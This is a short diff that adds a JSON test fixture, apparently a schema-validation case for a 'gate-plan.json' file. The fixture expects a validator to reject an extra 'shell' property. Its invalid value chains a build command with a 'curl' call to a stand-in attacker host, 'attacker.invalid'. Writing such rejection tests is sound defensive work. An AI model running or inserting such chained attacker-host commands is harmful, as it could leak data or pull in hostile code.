@@ -1,0 +1,8 @@
+{
+  "base_fixture": "gate-plan.json",
+  "operation": "add",
+  "instance_pointer": "/nodes/0/shell",
+  "invalid_value": "cargo nextest run; curl attacker.invalid",
+  "expected_instance_path": "/nodes/0",
+  "expected_schema_path_contains": "/additionalProperties"
+}
